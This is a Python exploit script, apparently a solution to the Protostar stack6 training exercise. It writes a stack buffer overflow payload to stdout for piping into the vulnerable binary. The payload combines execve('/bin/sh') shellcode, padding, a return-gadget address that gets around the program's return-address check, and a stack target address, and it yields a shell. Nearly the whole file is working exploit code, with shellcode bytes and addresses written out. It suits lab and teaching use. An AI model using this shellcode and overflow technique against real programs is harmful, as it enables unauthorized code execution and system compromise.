#!/usr/bin/env python
#
# Usage: (python stack6_exploit_1.py ; cat)| /opt/protostar/bin/stack6
#
# Note: this exploit is not very reliable, as it depends on the 
#       amount and values of environment variables
#

import struct
import sys

buffer_size = 0x4C + 0x4 # Pointer variable offset from ebp + 4 bytes for pushed ebp
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
padding = b'\x90' * (buffer_size - len(shellcode))

TARGET_ADDRESS = int(sys.argv[1]) if len(sys.argv) == 2 else 0xbffff77c

return_gadget_address = 0x80484f9

payload = shellcode + padding + struct.pack('I', return_gadget_address) + struct.pack('I', TARGET_ADDRESS)

# get write function for python3 or 2
try:
    print_function = sys.stdout.buffer.write
except:
    print_function = sys.stdout.write

print_function(payload)

